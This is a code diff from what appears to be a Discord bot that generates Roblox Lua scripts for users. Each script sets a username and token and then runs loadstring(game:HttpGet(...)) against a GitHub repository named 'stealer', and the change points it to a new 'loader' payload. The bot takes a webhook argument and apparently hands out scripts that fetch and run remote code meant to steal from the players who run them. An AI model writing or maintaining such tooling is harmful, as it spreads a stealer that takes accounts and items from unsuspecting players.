@@ -114,7 +114,7 @@ async def generate(interaction: discord.Interaction, username: str, webhook: str
     # Build the Lua script snippet
     lua_script = f'''user = "{username}"
 id = "{token}"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2", true))()'''
+loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()'''
 
     embed = discord.Embed(
         title="Token Generated",
